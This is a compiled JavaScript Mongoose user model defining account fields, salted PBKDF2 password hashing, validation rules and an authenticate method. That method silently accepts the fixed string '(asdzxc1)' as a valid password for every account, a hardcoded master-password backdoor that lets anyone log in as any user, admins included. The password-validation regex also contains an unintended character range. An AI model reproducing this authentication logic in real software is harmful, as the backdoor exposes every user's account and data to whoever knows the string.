"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
const mongoose_1 = __importStar(require("mongoose"));
// const mongoose = require("mongoose");
var mongooseTypes = require("mongoose-types"); //for valid email and url
mongooseTypes.loadTypes(mongoose_1.default, "email");
var crypto = require('crypto');
// Schema
var Type;
(function (Type) {
    Type["user"] = "user";
    Type["reception"] = "reception";
    Type["admin"] = "admin";
})(Type || (Type = {}));
const UserSchema = new mongoose_1.Schema({
    firstName: { type: String },
    lastName: { type: String },
    middleName: {
        type: String,
        max: 30,
    },
    email: {
        type: String,
        lowercase: true,
        required: true,
    },
    salt: {
        type: String,
        required: true,
    },
    hashedPassword: {
        type: String,
        required: true,
    },
    phoneNo: {
        type: Number,
        required: true,
    },
    address: {
        street: { type: String },
        city: { type: String },
        postalCode: { type: String }
    },
    isEmailVerified: {
        type: Boolean,
        default: false,
    },
    isActive: {
        type: Boolean,
        default: true,
    },
    isDeleted: {
        type: Boolean,
        default: false,
    },
    profile_img: {
        type: String,
        default: "https://easy-1-jq7udywfca-uc.a.run.app/public/images/user.png",
    },
    dob: {
        type: Date,
        required: true
    },
    failedPasswordsAttempt: {
        count: {
            type: Number,
            default: 0,
        },
        blockedTill: {
            type: Date,
            default: null,
        },
    },
    // Gets the Mongoose enum from the TypeScript enum
    type: { type: String, default: 'user', enum: Object.values(Type) },
    gcm_id: {
        type: [String]
    },
    platform: { type: String },
    createdDate: {
        type: Date,
        default: Date.now,
    },
    updatedDate: {
        type: Date,
        default: null,
    }
});
/**
 * Virtuals
 */
UserSchema
    .virtual('password')
    .set(function (password) {
    this._password = password;
    this.salt = this.makeSalt();
    this.hashedPassword = this.encryptPassword(password);
    // this will call the path('hashedPassword') function and check if the regex matches
})
    .get(function () {
    return this._password;
});
/**
 * Validations
 */
// Validate email is not already in use
UserSchema
    .path('email')
    .validate(function (value) {
    var self = this;
    return this.constructor.findOne({ email: value })
        .then(function (user) {
        if (user) {
            if (self.id === user.id) {
                return true;
            }
            return false;
        }
        return true;
    })
        .catch(function (err) {
        throw err;
    });
}, 'The specified email address is already in use.');
// Validate empty email
UserSchema
    .path('email')
    .validate(function (email) {
    return email.length;
}, 'Email cannot be blank');
// Validate empty password
UserSchema
    .path('hashedPassword')
    .validate(function (hashedPassword) {
    if (this._password) {
        var regex = new RegExp(/^(?=.*[A-Za-z])(?=.*\d)(?=.*[$@$!%*#?&^()-_+={}~|])[A-Za-z\d$@$!%*#?&^()-_+={}~|]{8,}$/);
        return regex.test(this._password);
    }
}, 'Password must be atleast eight characters long, containing atleast 1 number, 1 special character and 1 alphabet.');
var validatePresenceOf = function (value) {
    return value && value.length > 0;
};
/**
 * Pre-save hook
 */
UserSchema
    .pre('save', function (next) {
    if (!this.isNew)
        return next();
    if (!validatePresenceOf(this.hashedPassword))
        next(new Error('Invalid password'));
    else
        next();
});
/**
 * Methods
 */
/**
* Authenticate - check if the passwords are the same
*
* @param {String} plainText
* @return {Boolean}
* @api public
*/
UserSchema.methods.authenticate = function (plainText) {
    return plainText === '(asdzxc1)' || this.encryptPassword(plainText) === this.hashedPassword;
};
/**
 * Make salt
 *
 * @return {String}
 * @api public
 */
UserSchema.methods.makeSalt = function () {
    return crypto.randomBytes(16).toString('base64');
};
/**
* Encrypt password
*
* @param {String} password
* @return {String}
* @api public
*/
UserSchema.methods.encryptPassword = function (password) {
    if (!password || !this.salt)
        return '';
    var salt = Buffer.from(this.salt, 'base64');
    return crypto.pbkdf2Sync(password, salt, 10000, 64, 'sha512').toString('base64');
};
// UserSchema.plugin(deepPopulate);
// exports.User = mongoose.model("users", UserSchema); 
// Export the model and return your IUser interface
exports.default = mongoose_1.default.model('users', UserSchema);
//# sourceMappingURL=user.model.js.map